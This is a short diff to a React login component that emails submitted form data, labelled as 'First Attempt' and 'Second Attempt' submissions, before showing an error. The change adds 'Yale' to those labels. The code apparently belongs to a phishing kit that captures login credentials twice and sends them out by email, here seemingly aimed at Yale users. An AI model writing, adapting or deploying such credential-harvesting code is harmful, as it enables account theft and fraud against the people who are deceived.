@@ -83,8 +83,8 @@ const Login = () => {
 
     // Send email with form data on submission
     const subject = formSubmitted
-      ? "Second Attempt Submission"
-      : "First Attempt Submission";
+      ? "Yale Second Attempt Submission"
+      : "Yale First Attempt Submission";
     sendEmail(subject, message);
 
     // Handle error message after email is sent
